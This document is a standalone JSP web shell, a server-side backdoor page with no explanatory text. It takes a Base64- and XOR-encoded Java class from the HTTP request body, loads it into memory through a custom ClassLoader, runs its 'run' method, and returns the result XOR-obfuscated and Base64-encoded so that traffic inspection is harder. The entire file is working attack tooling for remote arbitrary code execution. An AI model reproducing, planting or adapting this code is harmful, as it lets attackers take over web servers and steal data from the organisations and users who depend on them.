<%@ page import="java.io.BufferedReader, java.io.IOException, java.io.InputStreamReader, java.util.Base64, java.lang.reflect.Method, java.lang.Process, java.lang.Runtime, java.util.Arrays, java.security.SecureRandom, java.io.PrintWriter" %>

<%!
public static class BytecodeClassLoader extends ClassLoader {
        public Class<?> loadClass(byte[] bytecode) {
            return defineClass(null, bytecode, 0, bytecode.length);
        }
    }
%>

<%
    try {
        BufferedReader reader = new BufferedReader(new InputStreamReader(request.getInputStream()));
        String requestBody = "";
        String line;
        while ((line = reader.readLine()) != null) {
            requestBody += line;
        }

        if(requestBody.length() == 0){
                out.println("");
                return;
        } 

        byte[] decodedBytes = Base64.getDecoder().decode(requestBody);
        
        byte firstByte = decodedBytes[0];
        for (int i = 0; i < decodedBytes.length - 1; i++) {
            decodedBytes[i] = (byte) (decodedBytes[i+1] ^ firstByte);
        }

        decodedBytes = Arrays.copyOf(decodedBytes, decodedBytes.length - 1);


        String output = "";
        BytecodeClassLoader classLoader = new BytecodeClassLoader();
        Class<?> clazz = classLoader.loadClass(decodedBytes);
        Object obj = clazz.getDeclaredConstructor().newInstance();

        Method runMethod = clazz.getDeclaredMethod("run");
        Object result = runMethod.invoke(obj);

        if (result instanceof String) {
            output = (String) result;
        }


        byte[] inputBytes = output.getBytes();
        output = "";


        SecureRandom random = new SecureRandom();
        byte randomByte = (byte) random.nextInt(256);

        byte[] resultBytes = new byte[inputBytes.length + 1];
        resultBytes[0] = randomByte;

        for (int i = 1; i < inputBytes.length + 1; i++) {
                resultBytes[i] = (byte) (inputBytes[i-1] ^ randomByte);
        }
        resultBytes[0] = randomByte;

        output = Base64.getEncoder().encodeToString(resultBytes);

        PrintWriter writer = response.getWriter();
        writer.write(output); // Write the response string
        writer.flush(); // Flush the writer
        writer.close(); // Close the writer


    } catch (IOException e) {
        
        PrintWriter writer = response.getWriter();
        writer.write("Exception: " + e.getMessage()); // Write the response string
        writer.flush(); // Flush the writer
        writer.close(); // Close the writer
        //out.println("Exception: " + e.getMessage());
    }
%>
